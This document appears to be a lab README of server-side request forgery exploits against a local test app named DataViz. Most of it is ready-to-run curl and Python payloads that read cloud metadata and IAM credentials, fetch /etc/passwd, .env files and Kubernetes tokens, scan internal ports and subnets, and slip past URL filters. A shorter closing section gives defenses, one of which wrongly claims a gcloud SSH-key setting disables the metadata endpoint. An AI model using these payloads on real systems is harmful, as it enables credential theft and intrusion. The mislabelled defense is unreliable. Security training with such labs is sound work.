# DataViz - Server-Side Request Forgery (SSRF) Exploits

## Overview
These exploits target SSRF vulnerabilities in DataViz's data source fetching feature.

## Target Application
- **Project**: DataViz
- **Port**: 5002
- **Vulnerable Feature**: External data source loading for charts
- **Vulnerability**: Unrestricted URL fetching without validation

## Prerequisites
```bash
# Ensure DataViz is running
docker-compose up -d dataviz
```

## Exploits

### ssrf_basic.py
Basic SSRF exploit to access internal resources and cloud metadata.

**Usage:**
```bash
python3 ssrf_basic.py
```

**What it does:**
- Sends requests to DataViz's data source endpoint
- Bypasses network restrictions by using the server as a proxy
- Accesses internal services, cloud metadata, and private networks
- Can read files via file:// protocol (if not filtered)

**Expected Output:**
```
[+] Targeting: http://localhost:5002/fetch_data
[+] SSRF Attack: Accessing cloud metadata
[+] URL: http://169.254.169.254/latest/meta-data/
[+] Response:
ami-id
ami-launch-index
ami-manifest-path
iam/security-credentials/
...
[+] SSRF successful!
```

## Attack Vectors

### 1. Cloud Metadata Access

#### AWS IMDSv1:
```bash
# Instance metadata
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

# IAM credentials
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Get role name
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"}'
```

#### Google Cloud:
```bash
# Requires Metadata-Flavor header (try if server forwards headers)
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}'
```

#### Azure:
```bash
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"http://169.254.169.254/metadata/instance?api-version=2021-02-01"}'
```

### 2. Internal Network Scanning

#### Port Scan:
```python
# Scan internal ports
import requests

target = "http://localhost:5002/fetch_data"
for port in range(1, 10000):
    payload = {"url": f"http://localhost:{port}"}
    r = requests.post(target, json=payload)
    
    if "Connection refused" not in r.text:
        print(f"Port {port} open: {r.text[:100]}")
```

#### Service Discovery:
```bash
# Scan internal services
for ip in 10.0.0.{1..254}; do
    curl -X POST http://localhost:5002/fetch_data \
         -d "{\"url\":\"http://$ip:80\"}" &
done
```

### 3. Internal Service Access

#### Docker Internal Network:
```bash
# Access other containers (if on same Docker network)
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"http://securedoc:5000/admin"}'

curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"http://chatapp:5006/api/messages"}'
```

#### Kubernetes Services:
```bash
# Access Kubernetes metadata
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"https://kubernetes.default.svc/api"}'

# Service account token
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"file:///var/run/secrets/kubernetes.io/serviceaccount/token"}'
```

### 4. File Access (Protocol Smuggling)

#### file:// Protocol:
```bash
# Read sensitive files
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"file:///etc/passwd"}'

curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"file:///app/config.py"}'

curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"file:///app/.env"}'
```

#### Other Protocols:
```bash
# dict:// for port scanning
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"dict://localhost:6379/INFO"}'

# gopher:// for protocol smuggling
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"gopher://localhost:25/_MAIL%20FROM..."}' 

# ftp:// for file access
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"ftp://internal-ftp.local/backup.zip"}'
```

### 5. Filter Bypasses

#### URL Encoding:
```bash
# Encode dots
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"http://169%2e254%2e169%2e254/latest/meta-data/"}'

# Encode slashes
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"http://169.254.169.254%2Flatest%2Fmeta-data%2F"}'
```

#### IP Representation:
```bash
# Decimal
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"http://2852039166/"}'  # 169.254.169.254 in decimal

# Octal
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"http://0251.0376.0251.0376/"}'

# Hex
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"http://0xa9.0xfe.0xa9.0xfe/"}'

# Short form
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"http://127.1/"}'  # Same as 127.0.0.1
```

#### DNS Rebinding:
```bash
# Use service that alternates between allowed and internal IPs
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"http://make-127-0-0-1-rr.1u.ms/"}'  # Rebinds to 127.0.0.1
```

## Advanced Exploitation

### Chain SSRF with Other Vulnerabilities:

#### SSRF → RCE:
```bash
# Access internal API that allows command execution
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"http://internal-admin:9090/exec?cmd=whoami"}'
```

#### SSRF → XXE:
```bash
# Trigger XXE on internal service
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"http://internal-xml-parser/parse?xml=<?xml...>"}'
```

#### SSRF → Open Redirect:
```bash
# Use open redirect to bypass URL filters
curl -X POST http://localhost:5002/fetch_data \
  -d '{"url":"http://trusted-domain.com/redirect?url=http://169.254.169.254/"}'
```

## Defense Recommendations

### 1. URL Whitelist
```python
ALLOWED_DOMAINS = [
    'api.example.com',
    'data.example.com',
    'cdn.example.com'
]

def validate_url(url):
    from urllib.parse import urlparse
    parsed = urlparse(url)
    
    # Only allow HTTP/HTTPS
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Only HTTP/HTTPS allowed")
    
    # Check against whitelist
    if parsed.netloc not in ALLOWED_DOMAINS:
        raise ValueError("Domain not in whitelist")
    
    return url
```

### 2. Block Private IP Ranges
```python
import ipaddress
import socket
from urllib.parse import urlparse

def is_safe_url(url):
    parsed = urlparse(url)
    
    # Resolve hostname to IP
    try:
        ip = socket.gethostbyname(parsed.hostname)
    except socket.gaierror:
        raise ValueError("Invalid hostname")
    
    # Check if IP is private
    ip_obj = ipaddress.ip_address(ip)
    
    # Block private ranges
    if ip_obj.is_private:
        raise ValueError("Private IP addresses not allowed")
    
    # Block loopback
    if ip_obj.is_loopback:
        raise ValueError("Loopback addresses not allowed")
    
    # Block link-local
    if ip_obj.is_link_local:
        raise ValueError("Link-local addresses not allowed")
    
    # Block metadata IPs
    if str(ip) in ['169.254.169.254', '::ffff:169.254.169.254']:
        raise ValueError("Metadata IP blocked")
    
    return True
```

### 3. Network Segmentation
```yaml
# docker-compose.yml
services:
  dataviz:
    networks:
      - public
    # No access to internal network
  
  internal-service:
    networks:
      - internal
    # No external access

networks:
  public:
    driver: bridge
  internal:
    driver: bridge
    internal: true  # No external connectivity
```

### 4. Use Safe HTTP Libraries
```python
import requests
from urllib.parse import urlparse

def safe_fetch(url):
    # Parse URL
    parsed = urlparse(url)
    
    # Validation
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Invalid scheme")
    
    # Use timeout
    response = requests.get(
        url,
        timeout=5,  # Prevent hanging
        allow_redirects=False,  # Prevent redirect bypasses
        verify=True  # Verify SSL certificates
    )
    
    return response.content
```

### 5. Cloud Provider Protection

#### AWS IMDSv2:
```bash
# Require token for metadata access
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1
```

#### Google Cloud:
```bash
# Disable metadata endpoint
gcloud compute instances add-metadata INSTANCE \
    --metadata=block-project-ssh-keys=TRUE
```

## Testing Checklist

- [ ] Try accessing AWS metadata (169.254.169.254)
- [ ] Try accessing Google Cloud metadata
- [ ] Try accessing Azure metadata  
- [ ] Scan internal IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- [ ] Try file:// protocol
- [ ] Try other protocols (dict://, gopher://, ftp://)
- [ ] Test filter bypasses (encoding, IP formats)
- [ ] Test DNS rebinding
- [ ] Scan localhost ports
- [ ] Access Docker internal network

## Notes
**WARNING**: SSRF can lead to:
- Cloud credential theft (AWS keys, GCP tokens, Azure credentials)
- Internal network reconnaissance
- Access to internal-only services
- Reading sensitive files
- Port scanning and service enumeration
- Potential RCE when chained with other vulnerabilities

## Related Exploits
- See `../rce/` for escalating SSRF to RCE
- Combine SSRF with other vulnerabilities for maximum impact
